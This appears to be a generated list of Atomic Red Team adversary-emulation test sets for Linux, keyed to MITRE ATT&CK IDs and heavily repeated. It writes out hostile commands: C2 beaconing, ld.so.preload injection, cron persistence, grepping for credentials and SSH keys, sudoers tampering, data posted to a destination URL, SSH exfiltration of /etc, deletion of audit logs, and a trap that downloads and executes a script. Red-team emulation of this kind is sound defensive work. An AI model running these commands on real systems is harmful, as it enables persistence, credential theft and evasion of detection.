curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1055 ,T1215 ,T1153 ,T1081 ,T1069 ,T1036 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1215: This test uses the insmod command to load a kernel module for Linux.
insmod #{kernel_module_file}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1069: Permission Groups Discovery
groups


T1036: Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.

Upon successful execution, sh is renamed to `crond` and executed.
cp /bin/sh /tmp/crond
/tmp/crond


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1169 ,T1215 ,T1064 ,T1145 ,T1135 ,T1027 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1215: This test uses the insmod command to load a kernel module for Linux.
insmod #{kernel_module_file}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1135: Network Share Discovery
df -aH >> ~/output/mount.txt
mount >> ~/output/mount.txt


T1027: Creates a base64-encoded data file and decodes it into an executable shell script

Upon successful execution, sh will execute art.sh, which is a base64 encoded command, that stdouts `echo Hello from the Atomic Red Team`.
sh -c "echo ZWNobyBIZWxsbyBmcm9tIHRoZSBBdG9taWMgUmVkIFRlYW0= > ~/output/encoded.dat"
cat ~/output/encoded.dat | base64 -d > ~/output/art.sh


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1169 ,T1168 ,T1153 ,T1081 ,T1033 ,T1222 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1168: This test adds a script to a cron folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
sudo echo "#{command}" > /etc/cron.daily/#{cron_script_name}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1033: Identify System owner or users on an endpoint

Upon successful execution, sh will stdout list of usernames.
users >> ~/output/users.txt
w >> ~/output/users.txt
who >> ~/output/users.txt


T1222: Changes a file or folder's permissions using chmod and a specified numeric mode.
chmod #{numeric_mode} #{file_or_folder}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1206 ,T1215 ,T1153 ,T1145 ,T1057 ,T1222 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1215: This test uses the insmod command to load a kernel module for Linux.
insmod #{kernel_module_file}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1057: Utilize ps to identify processes.

Upon successful execution, sh will execute ps and output to /tmp/loot.txt. 
ps >> #{output_file}
ps aux >> #{output_file}


T1222: Changes a file or folder's permissions using chmod and a specified numeric mode.
chmod #{numeric_mode} #{file_or_folder}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1169 ,T1158 ,T1153 ,T1040 ,T1087 ,T1036 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1087: Enumerate all accounts by copying /etc/passwd to another file
cat /etc/passwd > #{output_file}


T1036: Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.

Upon successful execution, sh is renamed to `crond` and executed.
cp /bin/sh /tmp/crond
/tmp/crond


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1169 ,T1168 ,T1153 ,T1040 ,T1018 ,T0002 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1168: This test adds a script to a cron folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
sudo echo "#{command}" > /etc/cron.daily/#{cron_script_name}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1018: Identify remote systems via arp.

Upon successful execution, sh will execute arp to list out the arp cache. Output will be via stdout.
arp -a | grep -v '^?' >> ~/output/arp_cache.txt


T0002: Uses shred to permanently remove a file and the file would be unrecoverable
shred -u #{file_to_remove}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1169 ,T1158 ,T1064 ,T1040 ,T1069 ,T1070 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1069: Permission Groups Discovery
groups


T1070: Delete system and audit logs
rm -rf /private/var/log/system.log*
rm -rf /private/var/audit/*


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1169 ,T1158 ,T1154 ,T1040 ,T1217 ,T1070 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1217: Searches for Mozilla Firefox's places.sqlite file (on Linux distributions) that contains bookmarks and lists any found instances to a text file.
find / -path "*.mozilla/firefox/*/places.sqlite" -exec echo {} >> ~/output/firefox-bookmarks.txt \;


T1070: Delete system and audit logs
rm -rf /private/var/log/system.log*
rm -rf /private/var/audit/*


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1206 ,T1168 ,T1153 ,T1040 ,T1087 ,T1036 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1168: This test adds a script to a cron folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
sudo echo "#{command}" > /etc/cron.daily/#{cron_script_name}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1087: Enumerate all accounts by copying /etc/passwd to another file
cat /etc/passwd > #{output_file}


T1036: Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.

Upon successful execution, sh is renamed to `crond` and executed.
cp /bin/sh /tmp/crond
/tmp/crond


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1055 ,T1136 ,T1154 ,T1145 ,T1083 ,T1009 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1136: Create a user via useradd
useradd -M -N -r -s /bin/bash -c evil_account #{username}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1083: Find or discover files on the file system
cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' >> ~/output/nix.txt
cat /etc/mtab >> ~/output/nix.txt
#find . -type f -iname *.pdf > ~/output/nix.txt
find . -type f -name ".*"


T1009: Uses dd to add a zero to the binary to change the hash.

Upon successful execution, dd will modify `/tmp/evil-binary`, therefore the expected hash will change.
dd if=/dev/zero bs=1 count=1 >> #{file_to_pad}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1169 ,T1168 ,T1153 ,T1040 ,T1057 ,T1070 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1168: This test adds a script to a cron folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
sudo echo "#{command}" > /etc/cron.daily/#{cron_script_name}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1057: Utilize ps to identify processes.

Upon successful execution, sh will execute ps and output to /tmp/loot.txt. 
ps >> #{output_file}
ps aux >> #{output_file}


T1070: Delete system and audit logs
rm -rf /private/var/log/system.log*
rm -rf /private/var/audit/*


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1055 ,T1215 ,T1154 ,T1040 ,T1057 ,T1036 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1215: This test uses the insmod command to load a kernel module for Linux.
insmod #{kernel_module_file}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1057: Utilize ps to identify processes.

Upon successful execution, sh will execute ps and output to /tmp/loot.txt. 
ps >> #{output_file}
ps aux >> #{output_file}


T1036: Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.

Upon successful execution, sh is renamed to `crond` and executed.
cp /bin/sh /tmp/crond
/tmp/crond


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1055 ,T1168 ,T1154 ,T1040 ,T1087 ,T1070 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1168: This test adds a script to a cron folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
sudo echo "#{command}" > /etc/cron.daily/#{cron_script_name}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1087: Enumerate all accounts by copying /etc/passwd to another file
cat /etc/passwd > #{output_file}


T1070: Delete system and audit logs
rm -rf /private/var/log/system.log*
rm -rf /private/var/audit/*


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1169 ,T1158 ,T1064 ,T1145 ,T1083 ,T1009 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1083: Find or discover files on the file system
cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' >> ~/output/nix.txt
cat /etc/mtab >> ~/output/nix.txt
#find . -type f -iname *.pdf > ~/output/nix.txt
find . -type f -name ".*"


T1009: Uses dd to add a zero to the binary to change the hash.

Upon successful execution, dd will modify `/tmp/evil-binary`, therefore the expected hash will change.
dd if=/dev/zero bs=1 count=1 >> #{file_to_pad}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1169 ,T1215 ,T1153 ,T1081 ,T1135 ,T1027 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1215: This test uses the insmod command to load a kernel module for Linux.
insmod #{kernel_module_file}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1135: Network Share Discovery
df -aH >> ~/output/mount.txt
mount >> ~/output/mount.txt


T1027: Creates a base64-encoded data file and decodes it into an executable shell script

Upon successful execution, sh will execute art.sh, which is a base64 encoded command, that stdouts `echo Hello from the Atomic Red Team`.
sh -c "echo ZWNobyBIZWxsbyBmcm9tIHRoZSBBdG9taWMgUmVkIFRlYW0= > ~/output/encoded.dat"
cat ~/output/encoded.dat | base64 -d > ~/output/art.sh


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
